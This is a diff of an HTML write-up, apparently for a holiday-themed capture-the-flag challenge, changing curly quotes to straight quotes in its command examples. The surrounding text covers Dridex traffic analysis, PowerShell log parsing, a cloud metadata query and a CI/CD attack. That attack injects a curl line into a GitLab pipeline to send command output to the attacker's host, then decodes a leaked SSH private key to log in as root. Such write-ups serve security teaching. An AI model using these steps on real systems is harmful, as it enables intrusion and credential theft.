@@ -1807,7 +1807,7 @@
   
 </figure>
 <p>Or with <code>tshark</code>:</p>
-<div class="box">$ tshark -r suspicious.pcap -Y &lsquo;dns.qry.name == &ldquo;adv.epostoday.uk&rdquo;&rsquo;</div>
+<div class="box">$ tshark -r suspicious.pcap -Y 'dns.qry.name == &quot;adv.epostoday.uk&quot;'</div>
 <p>Answer: <code>192.185.57.242</code></p>
 <div class="alert alert-warning" role="alert" data-dir="ltr">Q5. What file is saved to the infected host?</div>
 <p>If we download the <code>app.php</code> file we can see that in its source code. A base64 encoded bytestring is decoded and saved on disk as <code>Ref_Sept24-2020.zip</code>:</p>
@@ -1834,13 +1834,13 @@
 <div class="alert alert-warning" role="alert" data-dir="ltr">Q6. Attackers used bad TLS certificates in this traffic. Which countries were they registered to? Submit the names of the countries in alphabetical order separated by a commas (Ex: Norway, South Korea).</div>
 <p>We can filter all <em>TLS</em> packets that have a country code and remove all the legitimate calls to <em>Microsoft</em> services with the following filter: <code>(x509sat.CountryName) &amp;&amp; (not x509sat.printableString contains &quot;Microsoft&quot;)</code>. We see 2 countries, Israel and South Sudan.</p>
 <p>With <code>tshark</code>:</p>
-<div class="box">$ tshark -r suspicious.pcap -Y &lsquo;(x509sat.CountryName) &amp;&amp; (not x509sat.printableString contains &ldquo;Microsoft&rdquo;)&rsquo; -T fields -e x509sat.CountryName | uniq<br />
+<div class="box">$ tshark -r suspicious.pcap -Y '(x509sat.CountryName) &amp;&amp; (not x509sat.printableString contains &quot;Microsoft&quot;)' -T fields -e x509sat.CountryName | uniq<br />
 IL,IL<br />
 SS,SS</div>
 <p>Answer: <code>Israel, South Sudan</code></p>
 <div class="alert alert-warning" role="alert" data-dir="ltr">Q7. Is the host infected (Yes/No)?</div>
 <p>The user has probably received a phishing email containing a malicious link to <a href="http://adv.epostoday.uk/app.php">http://adv.epostoday.uk/app.php</a>. Once clicked, the script downloads the file <code>Ref_Sept24-2020.zip</code>. We can recreate the <em>ZIP</em> file from the encoded payload in the <code>app.php</code> source code with the following commands:</p>
-<div class="box">$ BYTES=&ldquo;UEsDBBQAAAAIAFCjN1FIq7H4ezsJAIN6CwATAAAAUmVmX1NlcHQyNC[&hellip;]&rdquo;<br />
+<div class="box">$ BYTES=&quot;UEsDBBQAAAAIAFCjN1FIq7H4ezsJAIN6CwATAAAAUmVmX1NlcHQyNC[&hellip;]&quot;<br />
 $ echo $BYTES | base64 -D &gt; Ref_Sept24-2020.zip</div>
 <p>The <em>ZIP</em> file contains a malicious <em>SCR</em> executable (do not execute it, it&rsquo;s a real malware). If we analyze the executable online, we see this is the <em>Dridex</em> installer. Once the user executed it, it started to communicate with the <em>C2</em> servers through <em>TLS</em>. The 2 malicious <em>IP</em> addresses are 62.98.109.30 (SS) and 151.236.219.181 (IL).</p>
 <figure >
@@ -1930,7 +1930,7 @@ $ echo $BYTES | base64 -D &gt; Ref_Sept24-2020.zip</div>
 <p>Answer: <code>12/24/2022</code></p>
 <div class="alert alert-warning" role="alert" data-dir="ltr">Q2. An attacker got a secret from a file. What was the original files&rsquo;s name?</div>
 <p>We can list all the commands that were logged with:<br />
-<div class="box">$ jq -s &lsquo;.. | .ScriptBlockText? | select(. != null) | select(. != &ldquo;prompt&rdquo;)&rsquo; powershell.json</div></p>
+<div class="box">$ jq -s '.. | .ScriptBlockText? | select(. != null) | select(. != &quot;prompt&quot;)' powershell.json</div></p>
 <figure >
   
   
@@ -1954,7 +1954,7 @@ $ echo $BYTES | base64 -D &gt; Ref_Sept24-2020.zip</div>
 <p>Answer: <code>Recipe</code></p>
 <div class="alert alert-warning" role="alert" data-dir="ltr">Q3. The content of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full Powershell line that performed only these actions.</div>
 <p>As we saw in the previous question, the variable where the content of the file is retrieved is <code>$foo</code>. Let&rsquo;s select those lines only with:<br />
-<div class="box">$ jq -s &lsquo;.. | .ScriptBlockText? | select(. != null) | select(contains(&quot;$foo&quot;))&rsquo; powershell.json</div></p>
+<div class="box">$ jq -s '.. | .ScriptBlockText? | select(. != null) | select(contains(&quot;$foo&quot;))' powershell.json</div></p>
 <figure >
   
   
@@ -2054,7 +2054,7 @@ $ echo $BYTES | base64 -D &gt; Ref_Sept24-2020.zip</div>
 <div class="alert alert-warning" role="alert" data-dir="ltr">Q10. What is the secret ingredient?</div>
 <p>From the result of the <code>cat ./Recipe</code> we can retrieve the initial recipe. We have to look for the <code>Out-Default</code> <em>Powershell</em> command that is executed after each command that outputs a result.</p>
 <p>We can narrow down the results as we know the recipe is about <code>Lembanh</code> with:<br />
-<div class="box">$ jq -s &lsquo;.. | .Payload? | select(. != null) | select(contains(&ldquo;Out-Default&rdquo;)) | select(contains(&ldquo;Lembanh&rdquo;))&rsquo; powershell.json | head -1</div></p>
+<div class="box">$ jq -s '.. | .Payload? | select(. != null) | select(contains(&quot;Out-Default&quot;)) | select(contains(&quot;Lembanh&quot;))' powershell.json | head -1</div></p>
 <p>We can then reconstruct the orginal recipe:</p>
 <div class="box"><p>Recipe from Mixolydian, the Queen of Dorian<br />
 Lembanh Original Recipe</p>
@@ -2251,7 +2251,7 @@ drwxr-xr-x  3 root root 4096 Dec  1 19:12 jailer</div>
 </figure>
 <p>Answer: <code>082bb339ec19de4935867</code></p>
 <div class="alert alert-info" role="alert" data-dir="ltr"><p>Fun fact, the <em>GCP</em> metadata service is reachable from the container. We can retrieve all the metadata of the host system with:</p>
-<div class="box">$ curl -H &ldquo;Metadata-Flavor:Google&rdquo; <a href="http://metadata.google.internal/computeMetadata/v1/?recursive=true">http://metadata.google.internal/computeMetadata/v1/?recursive=true</a></div>
+<div class="box">$ curl -H &quot;Metadata-Flavor:Google&quot; <a href="http://metadata.google.internal/computeMetadata/v1/?recursive=true">http://metadata.google.internal/computeMetadata/v1/?recursive=true</a></div>
 <p>Unfortunately, the host does not have any service-account set :)</p>
 </div>
 <h4 id="23-jolly-cicd">2.3 Jolly CI/CD</h4>
@@ -2298,7 +2298,7 @@ Omit --global to set the identity only in this repository.</p>
 </div>
 <p>So we configure our <em>Git</em> user:</p>
 <div class="box">$ git config --global user.email <a href="mailto:samways@grinchum-land.flag.net.internal">samways@grinchum-land.flag.net.internal</a><br />
-$ git config --global user.name &ldquo;samways&rdquo;</div>
+$ git config --global user.name &quot;samways&quot;</div>
 <p>We can now commit but when we push the change we need to provide a username/password that we do not have. When looking at the commit history, we can see a weird <code>whoops</code> comment in a commit:</p>
 <div class="box"><p>$ git log<br />
 Author: knee-oh <a href="mailto:sporx@kringlecon.com">sporx@kringlecon.com</a><br />
@@ -2347,7 +2347,7 @@ $ git clone <a href="mailto:git@gitlab.flag.net.internal">git@gitlab.flag.net.in
 <p>This time we can push changes to the repo without being asked for a username/password! The idea here would be to modify the pipeline config to leak some <em>Gitlab</em> server data to our host/container. First we get our <em>IP</em> address with <code>hostname -i</code> and try a basic <code>curl</code> back to our host. We add the following line to the <code>script</code> section of the <code>.gitlab-ci.yml</code> file:</p>
 <div class="box">- curl  &ldquo;http://172.18.0.99/$(id)&rdquo;</div>
 <p>We commit, push, start a local web listener and wait for a ping:</p>
-<div class="box">$ git add --all &amp;&amp; git commit -m &ldquo;test1&rdquo; &amp;&amp; git push &amp;&amp; python3 -m http.server 80</div>
+<div class="box">$ git add --all &amp;&amp; git commit -m &quot;test1&quot; &amp;&amp; git push &amp;&amp; python3 -m http.server 80</div>
 <p>No ping, let&rsquo;s replace <code>curl</code> with <code>wget</code> just in case <code>curl</code> is not installed. And this time, we get a call back leaking the output of the <code>id</code> command:</p>
 <figure >
   
@@ -2391,7 +2391,7 @@ $ git clone <a href="mailto:git@gitlab.flag.net.internal">git@gitlab.flag.net.in
   
 </figure>
 <p>We need to strip the superfluous <code>%0A</code> characters and we can save it:</p>
-<div class="box">$ echo &ldquo;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEOEVZZFpUT3BmNVJFdVdYTWI5RktDRldvaUlYMkhvVTFhSDkwVjBQdHEzd0FBQUppTVhyMEJqRjY5CkFRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRDhFWWRaVE9wZjVSRXVXWE1iOUZLQ0ZXb2lJWDJIb1UxYUg5MFYwUHRxM3cKQUFBRUJ0TkU2c3FPRm9xa21PaGNCLzlEZ3phUWhRUkMvYndrQWJzQlh3cXJ0L21Qd1JoMWxNNmwvbEVTNVpjeHYwVW9JVgphaUloZlllaFRWb2YzUlhRKzJyZkFBQUFGSE53YjNKNFFHdHlhVzVuYkdWamIyNHVZMjl0QVE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K&rdquo; | base64 -d &gt; priv</div>
+<div class="box">$ echo &quot;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEOEVZZFpUT3BmNVJFdVdYTWI5RktDRldvaUlYMkhvVTFhSDkwVjBQdHEzd0FBQUppTVhyMEJqRjY5CkFRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRDhFWWRaVE9wZjVSRXVXWE1iOUZLQ0ZXb2lJWDJIb1UxYUg5MFYwUHRxM3cKQUFBRUJ0TkU2c3FPRm9xa21PaGNCLzlEZ3phUWhRUkMvYndrQWJzQlh3cXJ0L21Qd1JoMWxNNmwvbEVTNVpjeHYwVW9JVgphaUloZlllaFRWb2YzUlhRKzJyZkFBQUFGSE53YjNKNFFHdHlhVzVuYkdWamIyNHVZMjl0QVE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K&quot; | base64 -d &gt; priv</div>
 <p>We can now use it to connect to the webserver as <code>root</code> and retrieve the flag at the root of the filesystem:</p>
 <div class="box">$ chmod 400 priv<br />
 $ ssh -i priv <a href="mailto:root@wordpress.flag.net.internal">root@wordpress.flag.net.internal</a></div>
